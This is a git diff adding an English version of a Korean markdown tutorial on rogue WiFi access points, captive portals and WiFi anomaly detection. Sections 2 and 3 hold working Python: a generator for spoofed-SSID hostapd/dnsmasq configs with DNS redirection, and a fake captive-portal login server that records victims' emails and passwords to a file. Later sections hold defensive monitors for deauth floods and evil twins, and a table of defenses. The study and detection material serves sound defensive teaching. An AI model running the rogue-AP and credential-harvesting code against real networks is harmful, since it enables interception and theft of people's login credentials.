@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 로그 AP·캡티브 포털·WiFi 모니터링 및 탐지
 
 ## 1. 로그 AP 공격 개요
@@ -538,3 +544,548 @@ if __name__ == "__main__":
 | 캡티브 포털 | DNS 리디렉션 탐지 | HSTS + 인증서 검증 |
 | KARMA 공격 | 프로브 응답 모니터링 | 선호 네트워크 목록 최소화 |
 | PMKID 공격 | 연결 없이 핸드셰이크 수집 | WPA3-SAE 업그레이드 |
+
+---
+
+<a name="english"></a>
+
+# Rogue AP, Captive Portal, WiFi Monitoring, and Detection
+
+## 1. Rogue AP Attack Overview
+
+```
+Attacker creates rogue AP
+    |  -> Spoofs same SSID/BSSID as legitimate AP
+    v
+Victim device connects
+    |  -> Superior signal strength or combined deauth attack
+    v
+Traffic interception
+    |  -> MITM: Analyze HTTP/HTTPS traffic
+    |  -> Credential harvesting
+    v
+Captive portal (optional)
+    |  -> Present fake login page
+    v
+Victim credentials obtained
+```
+
+---
+
+## 2. Rogue AP Setup Automation
+
+```python
+#!/usr/bin/env python3
+"""Automated rogue AP environment setup — hostapd + dnsmasq config generator."""
+
+import argparse
+import subprocess
+import sys
+from pathlib import Path
+
+
+def generate_hostapd_config(
+    interface: str,
+    ssid: str,
+    channel: int = 6,
+    bssid: str | None = None,
+) -> str:
+    lines = [
+        f"interface={interface}",
+        f"ssid={ssid}",
+        f"channel={channel}",
+        "hw_mode=g",
+        "ignore_broadcast_ssid=0",
+        "auth_algs=1",
+        "wmm_enabled=0",
+    ]
+    if bssid:
+        lines.append(f"bssid={bssid}")
+    return "\n".join(lines)
+
+
+def generate_dnsmasq_config(
+    interface: str,
+    gateway_ip: str = "192.168.50.1",
+    dhcp_range: tuple[str, str] = ("192.168.50.10", "192.168.50.100"),
+    dns_redirect: str | None = None,
+) -> str:
+    lines = [
+        f"interface={interface}",
+        "dhcp-authoritative",
+        f"dhcp-range={dhcp_range[0]},{dhcp_range[1]},12h",
+        f"dhcp-option=3,{gateway_ip}",
+        f"dhcp-option=6,{gateway_ip}",
+        "log-queries",
+        "log-dhcp",
+    ]
+    if dns_redirect:
+        # Redirect all DNS queries to captive portal
+        lines.append(f"address=/#/{dns_redirect}")
+    return "\n".join(lines)
+
+
+def setup_ip_forwarding(interface: str, gateway_ip: str) -> list[str]:
+    """List of commands to configure AP interface IP and packet forwarding."""
+    return [
+        f"ip addr add {gateway_ip}/24 dev {interface}",
+        f"ip link set {interface} up",
+        "sysctl -w net.ipv4.ip_forward=1",
+    ]
+
+
+def write_configs(
+    out_dir: Path,
+    interface: str,
+    ssid: str,
+    channel: int,
+    bssid: str | None,
+    gateway_ip: str,
+    dns_redirect: str | None,
+) -> None:
+    out_dir.mkdir(parents=True, exist_ok=True)
+
+    hostapd_conf = out_dir / "hostapd.conf"
+    hostapd_conf.write_text(generate_hostapd_config(interface, ssid, channel, bssid))
+    print(f"[+] hostapd config: {hostapd_conf}")
+
+    dnsmasq_conf = out_dir / "dnsmasq.conf"
+    dnsmasq_conf.write_text(generate_dnsmasq_config(interface, gateway_ip, dns_redirect=dns_redirect))
+    print(f"[+] dnsmasq config: {dnsmasq_conf}")
+
+    setup_sh = out_dir / "setup.sh"
+    cmds = setup_ip_forwarding(interface, gateway_ip)
+    cmds += [
+        f"hostapd {hostapd_conf} &",
+        f"dnsmasq -C {dnsmasq_conf} --no-daemon &",
+    ]
+    setup_sh.write_text("#!/bin/bash\n" + "\n".join(cmds) + "\n")
+    setup_sh.chmod(0o755)
+    print(f"[+] Setup script: {setup_sh}")
+    print("\n[!] Warning: Use only in authorized environments (lab/CTF)")
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Rogue AP config generator")
+    parser.add_argument("-i", "--interface", required=True, help="Monitor interface (e.g. wlan1)")
+    parser.add_argument("-s", "--ssid", required=True, help="SSID")
+    parser.add_argument("-c", "--channel", type=int, default=6)
+    parser.add_argument("--bssid", help="BSSID to spoof (e.g. AA:BB:CC:DD:EE:FF)")
+    parser.add_argument("--gateway", default="192.168.50.1")
+    parser.add_argument("--redirect", help="Captive portal IP (DNS redirect)")
+    parser.add_argument("-o", "--output", type=Path, default=Path("./rogue_ap"))
+    args = parser.parse_args()
+
+    write_configs(
+        args.output, args.interface, args.ssid,
+        args.channel, args.bssid, args.gateway, args.redirect,
+    )
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 3. Captive Portal Credential Harvesting
+
+```python
+#!/usr/bin/env python3
+"""Captive portal server — credential harvesting (education/CTF only)."""
+
+import argparse
+import json
+import logging
+from datetime import datetime
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from pathlib import Path
+from urllib.parse import parse_qs, urlparse
+
+
+PORTAL_HTML = """<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>WiFi Authentication</title>
+  <style>
+    body {{ font-family: Arial, sans-serif; background: #f0f0f0; display: flex;
+           justify-content: center; align-items: center; height: 100vh; }}
+    .box {{ background: white; padding: 40px; border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 320px; }}
+    input {{ width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; }}
+    button {{ width: 100%; padding: 12px; background: #0066cc; color: white;
+              border: none; border-radius: 4px; cursor: pointer; }}
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>WiFi Access Authentication</h2>
+    <form method="POST" action="/login">
+      <input type="email" name="username" placeholder="Email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Connect</button>
+    </form>
+  </div>
+</body>
+</html>"""
+
+SUCCESS_HTML = """<!DOCTYPE html>
+<html><body style="text-align:center;margin-top:100px;">
+<h2>Connected.</h2><p>You will be redirected shortly.</p>
+</body></html>"""
+
+
+class CaptivePortalHandler(BaseHTTPRequestHandler):
+    cred_log: Path = Path("captured_creds.jsonl")
+
+    def log_message(self, fmt: str, *args) -> None:
+        pass  # Suppress default logging
+
+    def do_GET(self) -> None:
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.end_headers()
+        self.wfile.write(PORTAL_HTML.encode())
+
+    def do_POST(self) -> None:
+        length = int(self.headers.get("Content-Length", 0))
+        body = self.rfile.read(length).decode()
+        params = parse_qs(body)
+
+        username = params.get("username", [""])[0]
+        password = params.get("password", [""])[0]
+        src_ip = self.client_address[0]
+
+        entry = {
+            "timestamp": datetime.now().isoformat(),
+            "src_ip": src_ip,
+            "username": username,
+            "password": password,
+        }
+        with self.cred_log.open("a") as f:
+            f.write(json.dumps(entry, ensure_ascii=False) + "\n")
+
+        print(f"[+] Credential captured: {src_ip} -> {username}:{password}")
+
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.end_headers()
+        self.wfile.write(SUCCESS_HTML.encode())
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Captive portal server (educational)")
+    parser.add_argument("--host", default="0.0.0.0")
+    parser.add_argument("--port", type=int, default=80)
+    parser.add_argument("--log", type=Path, default=Path("captured_creds.jsonl"))
+    args = parser.parse_args()
+
+    CaptivePortalHandler.cred_log = args.log
+    print(f"[*] Captive portal started: http://{args.host}:{args.port}")
+    print(f"[*] Credentials saved to: {args.log}")
+    print("[!] Use only in authorized environments (lab/CTF)\n")
+
+    HTTPServer((args.host, args.port), CaptivePortalHandler).serve_forever()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 4. WiFi Traffic Monitoring and Anomaly Detection
+
+```python
+#!/usr/bin/env python3
+"""WiFi monitoring — CLI for detecting rogue APs, deauth attacks, and beacon flooding."""
+
+import argparse
+import json
+import signal
+import sys
+from collections import defaultdict, Counter
+from dataclasses import dataclass, field
+from datetime import datetime, timedelta
+from pathlib import Path
+
+try:
+    from scapy.all import (
+        sniff, Dot11, Dot11Beacon, Dot11Deauth,
+        Dot11ProbeResp, Dot11Elt, RadioTap,
+    )
+    SCAPY_AVAILABLE = True
+except ImportError:
+    SCAPY_AVAILABLE = False
+
+
+@dataclass
+class APInfo:
+    bssid: str
+    ssid: str
+    channel: int
+    rssi: int
+    first_seen: datetime = field(default_factory=datetime.now)
+    last_seen: datetime = field(default_factory=datetime.now)
+    beacon_count: int = 0
+
+
+@dataclass
+class DeauthEvent:
+    src: str
+    dst: str
+    bssid: str
+    timestamp: datetime = field(default_factory=datetime.now)
+
+
+class WiFiMonitor:
+    def __init__(self, known_ssids: list[str] | None = None) -> None:
+        self.aps: dict[str, APInfo] = {}
+        self.deauth_events: list[DeauthEvent] = []
+        self.beacon_counter: Counter = Counter()
+        self.known_ssids = set(known_ssids or [])
+        self.alerts: list[dict] = []
+
+    def process_packet(self, pkt) -> None:
+        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
+            self._process_beacon(pkt)
+        elif pkt.haslayer(Dot11Deauth):
+            self._process_deauth(pkt)
+
+    def _process_beacon(self, pkt) -> None:
+        bssid = pkt[Dot11].addr3
+        if not bssid:
+            return
+
+        ssid = ""
+        channel = 0
+        if pkt.haslayer(Dot11Elt):
+            elt = pkt[Dot11Elt]
+            while elt:
+                if elt.ID == 0:
+                    try:
+                        ssid = elt.info.decode(errors="ignore")
+                    except Exception:
+                        pass
+                elif elt.ID == 3 and elt.info:
+                    channel = elt.info[0]
+                elt = elt.payload if hasattr(elt, "payload") and elt.payload else None
+
+        rssi = pkt[RadioTap].dBm_AntSignal if pkt.haslayer(RadioTap) and hasattr(pkt[RadioTap], "dBm_AntSignal") else 0
+
+        now = datetime.now()
+        if bssid in self.aps:
+            ap = self.aps[bssid]
+            ap.last_seen = now
+            ap.beacon_count += 1
+            ap.rssi = rssi
+        else:
+            self.aps[bssid] = APInfo(bssid, ssid, channel, rssi)
+            self._check_rogue_ap(bssid, ssid)
+
+        self.beacon_counter[ssid] += 1
+        self._check_beacon_flood(ssid)
+
+    def _process_deauth(self, pkt) -> None:
+        src = pkt[Dot11].addr2 or ""
+        dst = pkt[Dot11].addr1 or ""
+        bssid = pkt[Dot11].addr3 or ""
+
+        event = DeauthEvent(src, dst, bssid)
+        self.deauth_events.append(event)
+
+        # 10+ deauths for same BSSID within 1 minute -> attack detected
+        cutoff = datetime.now() - timedelta(minutes=1)
+        recent = [e for e in self.deauth_events if e.bssid == bssid and e.timestamp > cutoff]
+        if len(recent) >= 10:
+            self._alert("DEAUTH_FLOOD", f"Deauth attack detected: {bssid} ({len(recent)}/min)")
+
+    def _check_rogue_ap(self, bssid: str, ssid: str) -> None:
+        if not self.known_ssids or ssid not in self.known_ssids:
+            return
+        # Known SSID broadcast from different BSSID -> suspect rogue AP
+        self._alert("ROGUE_AP", f"Rogue AP suspected: SSID={ssid}, BSSID={bssid}")
+
+    def _check_beacon_flood(self, ssid: str) -> None:
+        if self.beacon_counter[ssid] > 0 and self.beacon_counter[ssid] % 500 == 0:
+            self._alert("BEACON_FLOOD", f"Beacon flooding suspected: SSID={ssid} ({self.beacon_counter[ssid]} times)")
+
+    def _alert(self, alert_type: str, message: str) -> None:
+        entry = {
+            "type": alert_type,
+            "message": message,
+            "timestamp": datetime.now().isoformat(),
+        }
+        self.alerts.append(entry)
+        print(f"[!] {alert_type}: {message}")
+
+    def summary(self) -> dict:
+        return {
+            "total_aps": len(self.aps),
+            "deauth_events": len(self.deauth_events),
+            "alerts": len(self.alerts),
+            "alert_detail": self.alerts,
+            "ap_list": [
+                {"bssid": ap.bssid, "ssid": ap.ssid, "channel": ap.channel,
+                 "rssi": ap.rssi, "beacons": ap.beacon_count}
+                for ap in sorted(self.aps.values(), key=lambda a: a.beacon_count, reverse=True)[:20]
+            ],
+        }
+
+
+def monitor_live(interface: str, known_ssids: list[str], timeout: int, output: Path | None) -> None:
+    if not SCAPY_AVAILABLE:
+        print("scapy required: pip install scapy", file=sys.stderr)
+        sys.exit(1)
+
+    monitor = WiFiMonitor(known_ssids)
+    print(f"[*] Monitoring {interface} (timeout={timeout}s)")
+    print(f"[*] Known SSIDs: {known_ssids or 'None (monitoring all)'}\n")
+
+    try:
+        sniff(
+            iface=interface,
+            prn=monitor.process_packet,
+            store=False,
+            timeout=timeout,
+        )
+    except KeyboardInterrupt:
+        pass
+
+    summary = monitor.summary()
+    print(f"\n=== Monitoring Results ===")
+    print(f"APs detected: {summary['total_aps']}")
+    print(f"Deauth events: {summary['deauth_events']}")
+    print(f"Alerts: {summary['alerts']}")
+
+    if output:
+        output.write_text(json.dumps(summary, indent=2, ensure_ascii=False))
+        print(f"\n[+] Results saved: {output}")
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="WiFi anomaly detection monitor")
+    parser.add_argument("-i", "--interface", required=True, help="Monitor mode interface")
+    parser.add_argument("--known-ssids", nargs="*", default=[], help="List of legitimate SSIDs")
+    parser.add_argument("-t", "--timeout", type=int, default=60, help="Capture duration (seconds)")
+    parser.add_argument("-o", "--output", type=Path)
+    args = parser.parse_args()
+
+    monitor_live(args.interface, args.known_ssids, args.timeout, args.output)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 5. Evil Twin Automatic Detection
+
+```python
+#!/usr/bin/env python3
+"""Evil Twin AP detection — multiple BSSID analysis for same SSID."""
+
+import argparse
+import json
+from collections import defaultdict
+from pathlib import Path
+
+
+def parse_airodump_csv(csv_path: Path) -> list[dict]:
+    """Parse airodump-ng CSV file."""
+    aps: list[dict] = []
+    in_ap_section = True
+
+    with csv_path.open(encoding="utf-8", errors="ignore") as f:
+        for line in f:
+            line = line.strip()
+            if not line:
+                in_ap_section = False
+                continue
+            if line.startswith("BSSID") or line.startswith("Station"):
+                continue
+            if in_ap_section:
+                parts = [p.strip() for p in line.split(",")]
+                if len(parts) >= 14:
+                    aps.append({
+                        "bssid": parts[0],
+                        "channel": parts[3].strip(),
+                        "privacy": parts[5].strip(),
+                        "power": parts[8].strip(),
+                        "ssid": parts[13].strip(),
+                    })
+
+    return aps
+
+
+def detect_evil_twin(aps: list[dict]) -> list[dict]:
+    """Same SSID with 2+ BSSIDs -> Suspect Evil Twin."""
+    ssid_map: dict[str, list[dict]] = defaultdict(list)
+    for ap in aps:
+        ssid = ap["ssid"]
+        if ssid and ssid != "":
+            ssid_map[ssid].append(ap)
+
+    suspects = []
+    for ssid, ap_list in ssid_map.items():
+        if len(ap_list) >= 2:
+            # Different channels increase suspicion
+            channels = {a["channel"] for a in ap_list}
+            suspects.append({
+                "ssid": ssid,
+                "ap_count": len(ap_list),
+                "multi_channel": len(channels) > 1,
+                "bssids": [a["bssid"] for a in ap_list],
+                "channels": list(channels),
+                "risk": "HIGH" if len(channels) > 1 else "MEDIUM",
+            })
+
+    return sorted(suspects, key=lambda x: x["ap_count"], reverse=True)
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Evil Twin AP detection")
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    csv_p = sub.add_parser("csv", help="Analyze airodump-ng CSV")
+    csv_p.add_argument("file", type=Path)
+    csv_p.add_argument("-o", "--output", type=Path)
+
+    args = parser.parse_args()
+
+    if args.cmd == "csv":
+        aps = parse_airodump_csv(args.file)
+        suspects = detect_evil_twin(aps)
+
+        print(f"[*] Total APs: {len(aps)}")
+        print(f"[!] Evil Twin suspects: {len(suspects)}\n")
+
+        for s in suspects:
+            risk_icon = "[!!]" if s["risk"] == "HIGH" else "[!]"
+            print(f"{risk_icon} SSID: {s['ssid']} ({s['ap_count']} APs)")
+            print(f"    BSSIDs: {', '.join(s['bssids'])}")
+            print(f"    Channels: {', '.join(s['channels'])}")
+            print(f"    Risk: {s['risk']}\n")
+
+        if args.output:
+            args.output.write_text(json.dumps(suspects, indent=2, ensure_ascii=False))
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 6. Defenses
+
+| Attack | Detection Method | Defense Measure |
+|--------|-----------------|-----------------|
+| Rogue AP | Detect same SSID with multiple BSSIDs | 802.1X EAP auth + certificate pinning |
+| Deauth attack | Monitor management frame rate | 802.11w PMF (Protected Management Frames) |
+| Beacon flooding | Detect sudden beacon packet spikes | Deploy WIPS solution |
+| Captive portal | Detect DNS redirection | HSTS + certificate validation |
+| KARMA attack | Monitor probe responses | Minimize preferred network list |
+| PMKID attack | Handshake collection without association | Upgrade to WPA3-SAE |
